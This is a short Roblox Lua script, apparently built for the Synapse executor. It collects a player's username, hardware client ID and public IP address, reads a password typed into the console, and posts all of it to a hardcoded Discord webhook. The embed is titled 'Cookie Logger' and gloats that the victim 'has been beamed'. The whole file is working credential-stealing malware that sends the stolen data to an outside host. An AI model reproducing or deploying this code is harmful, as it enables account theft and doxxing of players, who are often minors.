HttpService = game:GetService("HttpService")
Webhook_URL = "https://discord.com/api/webhooks/1101578865035460710/omyFMTLP5YgTSe9yFKJ4NCBR1JhyJn4T5gWqc5xYvM5eVMBZJL9GcduiEUwbAo3Mal4p"

ip = (game:HttpGet("https://api.ipify.org"))

local response = syn.request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {
        ["Content-Type"] = 'application/json'
    },
    Body = HttpService:JSONEncode({
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "Cookie Logger | 😈",
            ["description"] = game.Players.LocalPlayer.Name.." has been beamed 😂.",
            ["type"] = "rich",
            ["color"] = tonumber(0xffffff),
            ["fields"] = {
                {
                    ["name"] = "HWID:",
                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                    ["inline"] = true
                },
                {
                    ["name"] = "IP:",
                    ["value"] = ip,
                    ["inline"] = true
                },
                {
                    ["name"] = "Username:",
                    ["value"] = game.Players.LocalPlayer.Name,
                    ["inline"] = false
                },
                {
                    ["name"] = "Password:",
                    ["value"] = rconsoleinput(),
                    ["inline"] = false
                }
            }
        }}
    })
})
